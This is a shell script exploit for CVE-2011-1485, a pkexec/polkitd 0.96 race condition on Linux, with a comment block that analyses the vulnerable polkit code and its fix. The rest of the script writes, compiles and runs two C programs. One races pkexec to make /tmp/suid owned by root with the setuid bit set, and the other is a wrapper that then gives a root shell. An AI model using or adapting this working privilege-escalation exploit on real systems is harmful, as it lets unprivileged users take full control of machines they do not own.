#!/bin/sh

<<COMMENT1

Exploit Title: Linux pkexec and polkitd 0.96 race condition privilege escalation
Date: Sun Oct  9 00:31:10 WIT 2011
Author: Ev1lut10n 
About Ev1lut10n:
http://jasaplus.com/ev1lut10n
A Chinese Man Lives in Indonesia
Software Link: http://pkgs.fedoraproject.org/repo/pkgs/polkit/polkit-0.96.tar.gz/e0a06da501b04ed3bab986a9df5b5aa2/
Version: 0.96
Tested on: 2.6.35-22-generic #33-Ubuntu SMP Sun Sep 19 20:34:50 UTC 2010 i686 GNU/Linux under Gnome Environment
CVE : CVE-2011-1485

Brief Descriptions

src/polkit/polkitunixprocess.c  where it fails to clarify the real uid, under this race condition it will return the effective one.
on : polkit_unix_process_get_owner (PolkitUnixProcess *process,
  g_snprintf (procbuf, sizeof procbuf, "/proc/%d", process->pid);
  if (stat (procbuf, &statbuf) != 0)
    {
      g_set_error (error,
                   POLKIT_ERROR,
                   POLKIT_ERROR_FAILED,
                   "stat() failed for /proc/%d: %s",
                   process->pid,
                   g_strerror (errno));
      goto out;
    }
where the code only rely on stat of the pseudo filesystem 

src/polkit/polkitsubject.c ---------> there's not enough validation to run polkit_unix_process_new

on  polkit_subject_from_string (const gchar *str, 
there's no enough validation before launching polkit_unix_process_new 
 if (g_str_has_prefix (str, "unix-process:"))
    {
      val = g_ascii_strtoull (str + sizeof "unix-process:" - 1,
                              &endptr,
                              10);
      if (*endptr == '\0')
        {
          subject = polkit_unix_process_new ((gint) val);

the fix is to add more validations (polkit_unix_process_new_for_owner,polkit_unix_process_new_full,polkit_unix_process_new_full):

if (sscanf (str, "unix-process:%d:%" G_GUINT64_FORMAT ":%d", &scanned_pid, &scanned_starttime, &scanned_uid) == 3)
         {
+          subject = polkit_unix_process_new_for_owner (scanned_pid, scanned_starttime, scanned_uid);
+        }
+      else if (sscanf (str, "unix-process:%d:%" G_GUINT64_FORMAT, &scanned_pid, &scanned_starttime) == 2)
+        {
+          subject = polkit_unix_process_new_full (scanned_pid, scanned_starttime);
+        }
+      else if (sscanf (str, "unix-process:%d", &scanned_pid) == 1)
+        {
+          subject = polkit_unix_process


src/polkitbackend/polkitbackendsessionmonitor.c
function polkit_backend_session_monitor_get_user_for_subject (PolkitBackendSessionMonitor

if (POLKIT_IS_UNIX_PROCESS (subject))
    {
      GError *local_error;

      local_error = NULL;
      uid = polkit_unix_process_get_owner (POLKIT_UNIX_PROCESS (subject), &local_error);


as we may see from above code : "polkit_unix_process_get_owner" will not avoid "Time of Check to Time of Use Problem" 
http://www.usenix.org/events/fast05/tech/full_papers/wei/wei.pdf


src/programs/pkexec.c
pkexec doesn't use the uid of parent process had and will still continue when the parent die :

  pid_of_caller = getppid ();
  if (pid_of_caller == 1)
    {
           pid_of_caller = getpgrp ();
    }

  subject = polkit_unix_process_new (pid_of_caller);


where it will continue even if the parent is dead.

where the patch has been applied by adding prctl to check the death signal of the parent process (PR_SET_PDEATHSIG):

if (prctl (PR_SET_PDEATHSIG, SIGTERM) != 0)
+    {
+      g_printerr ("prctl(PR_SET_PDEATHSIG, SIGTERM) failed: %s\n", g_strerror (errno)); /**So if our parent die goto out***/
+      goto out;
+    }


COMMENT1



cat > suid.c << _EOF
#include <stdio.h>
#include <string.h>
int main(int argc,char *argv[])
{
char *root=malloc(1000);
char perintah[256]="/bin/sh -c ";
int i;
char *spasi=" ";
       strcat(root,perintah);
      for (i=1;i<argc;i++)
      {
        strcat(root,argv[i]);
        strcat(root,spasi);      
      }     
setuid(0);
setgid(0);
system(root);
}
_EOF



cat > makesuid.c << _EOF
/**this code was modified from http://www.exploit-db.com/exploits/17932/  by zx2c **/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/inotify.h>
int main(int argc, char **argv)
{
	 if (fork() != 0)
	{	    
		int fd;
		char pid_path[15];
		sprintf(pid_path, "/proc/%i", getpid());
		close(0); close(1); close(2);
		fd = inotify_init();
		inotify_add_watch(fd, pid_path, IN_ACCESS);
		read(fd, NULL, 0);
		execl("/usr/bin/X", "X", NULL);	
	}   
	else
	{
		    execl("/usr/bin/pkexec", "pkexec", argv[1],argv[2],argv[3], NULL);
	}

    return 0;
}

_EOF


gcc -o /tmp/suid suid.c
gcc -o makesuid makesuid.c
./makesuid chown root:root /tmp/suid
./makesuid chmod u+s /tmp/suid
echo "your suid is on /tmp/suid make sure u move this !!!"
/tmp/./suid -c /bin/sh

